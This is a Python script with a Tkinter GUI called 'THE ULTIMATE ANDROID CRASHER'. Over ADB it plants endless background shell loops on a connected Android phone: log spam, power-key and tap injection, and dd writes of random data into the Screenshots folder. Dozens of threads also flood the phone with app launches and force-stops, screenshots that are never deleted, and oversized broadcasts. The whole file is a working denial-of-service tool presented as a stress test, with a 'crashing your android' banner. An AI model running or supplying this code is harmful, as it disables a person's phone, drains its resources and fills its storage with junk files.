import threading
import random
import time
import subprocess
import os
import tkinter as tk
from tkinter import ttk
from adb.client import Client as AdbClient

# 1. Connect to local ADB server
client = AdbClient(host="127.0.0.1", port=5037)
devices = client.devices()

if not devices:
    print("No USB devices found.")
    exit()

device = devices[0]

# Fetch user and system applications (including deep hidden system services)
packages_raw = device.shell("pm list packages")
apps = [line.split(":")[-1].strip() for line in packages_raw.splitlines() if line.strip()]

# Massive text buffer optimized to max out modern high-capacity RAM buffers (LPDDR5X)
heavy_text = "LAG_OVERFLOW_MEMORY_DUMP_FLAGSHIP_STRESS_" * 100000 

# --- INTERNAL PHONE-SIDE RECURSION LOOPS (MULTI-CORE TARGETED) ---
# These force modern high-performance CPU cores to max out natively without relying on USB transport speed.
SHELL_STRESS_COMMANDS = [
    # Loops 1-4: Massive parallel kernel log and buffer spamming to throttle the Prime & Performance clusters
    "while true; do log -p f -t CRASHER 'FLAGSHIP_CORE_OVERLOAD_ACTIVE'; log -p e -t CRASHER 'PERF_FLUSH'; done &",
    "while true; do log -p f -t OVERLOAD 'THROTTLE_TRIGGER'; done &",
    
    # Loop 5: Severe hardware overlay composition stalls on high refresh-rate displays (120Hz/144Hz)
    "while true; do service call window 1; service call window 2; service call window 3; done &",
    
    # Loop 6: UI Vector Stress - Forcing intense GPU blur calculations by spamming statusbar/notification animations
    "while true; do cmd statusbar expansion-drag 100; cmd statusbar expansion-drag 0; done &",
    
    # Loop 7: High-frequency input simulation targeting touch sampling handlers and window focus events
    "while true; do input keyevent 26; input keyevent 25; input tap 500 500; input swipe 100 100 500 500 10; done &",
    
    # Loops 8-10: Quad-channel parallel raw storage allocation blocks to choke modern high-bandwidth UFS 4.0 storage controllers
    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap1.bin bs=10M count=5; rm /sdcard/Pictures/Screenshots/swap1.bin; done &",
    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap2.bin bs=10M count=5; rm /sdcard/Pictures/Screenshots/swap2.bin; done &",
    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap3.bin bs=10M count=5; rm /sdcard/Pictures/Screenshots/swap3.bin; done &"
]

# --- PC-TO-PHONE MULTI-THREADED FLOOD WORKERS (SCALED UP FOR 8+ CORES) ---

def app_flood():
    """Forces extreme lifecycle thrashing and rapid memory allocation via sequential app forks."""
    while True:
        try:
            app1, app2, app3, app4 = random.choice(apps), random.choice(apps), random.choice(apps), random.choice(apps)
            # Parallel process execution via native Unix background tracking to choke the Zygote handler
            device.shell(f"monkey -p {app1} 1 & monkey -p {app2} 1 & monkey -p {app3} 1 & monkey -p {app4} 1")
            device.shell(f"am force-stop {random.choice(apps)} & am force-stop {random.choice(apps)} & am force-stop {random.choice(apps)}")
        except Exception: pass

def screenshot_flood():
    """Forces massive multi-channel frame allocation pipelines to overload display server composition."""
    while True:
        try:
            r1, r2, r3, r4 = random.randint(1,999999), random.randint(1,999999), random.randint(1,999999), random.randint(1,999999)
            # Stack 4 high-resolution frame encodings concurrently to jam the hardware graphics composer
            device.shell(f"screencap -p /sdcard/Pictures/Screenshots/st_{r1}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r2}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r3}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r4}.png")
        except Exception: pass

def clipboard_flood():
    """Floods the system IPC (Inter-Process Communication), Binder memory space, and text buffer limits."""
    while True:
        try:
            device.shell(f"am broadcast -a android.intent.action.SEND --es android.intent.extra.TEXT '{heavy_text}' & am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE")
        except Exception: pass

# --- GUI ROUTINES ---

root = tk.Tk()
root.title("THE ULTIMATE ANDROID CRASHER")
root.geometry("450x200")
root.configure(bg="black")
root.resizable(False, False)

style = ttk.Style()
style.theme_use('default')
style.configure("Green.Horizontal.TProgressbar", background="#00FF00", troughcolor="black", bordercolor="black")

label = tk.Label(root, text="crashing your android....", font=("Courier", 16, "bold"), fg="#00FF00", bg="black")
label.pack(pady=30)

progress = ttk.Progressbar(root, style="Green.Horizontal.TProgressbar", orient="horizontal", length=350, mode="determinate")
progress.pack(pady=10)

status_label = tk.Label(root, text="Preparing USB data links...", font=("Courier", 10), fg="#00FF00", bg="black")
status_label.pack(pady=5)

def start_stress_test():
    status_label.config(text="Deploying 48 High-Performance Workers & scrcpy...")
    root.update()
    
    # Phase 1: Inject internal infinite background loops directly into the phone's local Unix sub-shell
    for cmd in SHELL_STRESS_COMMANDS:
        try:
            device.shell(cmd)
        except Exception: pass
        
    # Phase 2: Launch 48 PC-side asynchronous thread workers to crush heavy multi-core architectures
    threads = []
    for _ in range(18): threads.append(threading.Thread(target=app_flood, daemon=True))
    for _ in range(18): threads.append(threading.Thread(target=screenshot_flood, daemon=True))
    for _ in range(12): threads.append(threading.Thread(target=clipboard_flood, daemon=True))
    
    for t in threads:
        t.start()
        
    # Phase 3: Spin up scrcpy to watch the high-refresh layout frames completely buckle
    try:
        subprocess.Popen(["scrcpy", "--always-on-top", "--window-title=CRASHER_VIEW", "--max-fps=30"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        status_label.config(text="Error: 'scrcpy' binary not found in system PATH.")
        return

    status_label.config(text="MAXIMUM SYSTEM RESOURCE EXHAUSTION ACTIVE.")

def simulate_usb_push():
    dummy_file = "payload.bin"
    remote_path = "/data/local/tmp/payload.bin"
    file_size_mb = 75 # Extended data parsing payload to maximize storage cache warm-up
    
    with open(dummy_file, "wb") as f:
        f.write(os.urandom(file_size_mb * 1024 * 1024))
        
    total_bytes = os.path.getsize(dummy_file)

    def progress_callback(filename, uploaded_bytes, total):
        percentage = (uploaded_bytes / total_bytes) * 100
        progress['value'] = percentage
        status_label.config(text=f"Sending Payload: {uploaded_bytes // 1024}KB / {total_bytes // 1024}KB")
        root.update_idletasks()

    try:
        device.push(dummy_file, remote_path, progress_callback=progress_callback)
    finally:
        if os.path.exists(dummy_file): os.remove(dummy_file)
        try: device.shell(f"rm {remote_path}")
        except Exception: pass

    progress['value'] = 100
    start_stress_test()

root.after(1000, lambda: threading.Thread(target=simulate_usb_push, daemon=True).start())
root.mainloop()
